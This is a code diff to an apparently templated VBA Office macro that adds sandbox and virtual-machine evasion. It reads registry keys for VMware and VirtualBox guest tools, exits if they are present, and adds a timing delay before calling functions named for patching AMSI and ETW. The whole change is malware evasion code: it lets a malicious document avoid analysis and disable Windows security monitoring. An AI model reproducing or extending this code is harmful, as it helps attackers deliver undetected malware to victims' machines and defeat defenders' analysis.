@@ -110,10 +110,28 @@ Private Function {{ v.fn_sandbox }}() As Boolean
     For i = 0 To UBound(badC)
         If InStr(cname, CStr(badC(i))) > 0 Then {{ v.fn_sandbox }} = True: Exit Function
     Next
+    ' VM/hypervisor registry key checks
+    Dim vmKeyPath As String
+    vmKeyPath = "HKLM\SOFTWARE\VMware, Inc.\VMware Tools\InstallPath"
+    On Error Resume Next
+    Dim regVal As String
+    regVal = Environ("PROCESSOR_IDENTIFIER")  ' will be replaced by Shell.RegRead pattern
+    Dim wshShell As Object
+    Set wshShell = CreateObject("WScript.Shell")
+    wshShell.RegRead vmKeyPath
+    If Err.Number = 0 Then {{ v.fn_sandbox }} = True: Set wshShell = Nothing: Exit Function
+    Err.Clear
+    wshShell.RegRead "HKLM\SOFTWARE\Oracle\VirtualBox Guest Additions\Version"
+    If Err.Number = 0 Then {{ v.fn_sandbox }} = True: Set wshShell = Nothing: Exit Function
+    Err.Clear
+    Set wshShell = Nothing
 End Function
 
 Private Sub {{ v.fn_exec }}()
     If {{ v.fn_sandbox }}() Then Exit Sub
+    ' Execution delay to defeat sandbox timing
+    Dim tStart As Date: tStart = Now
+    Do While DateDiff("s", tStart, Now) < 2: DoEvents: Loop
     Call {{ v.fn_amsi_patch }}
     Call {{ v.fn_etw_patch }}
 
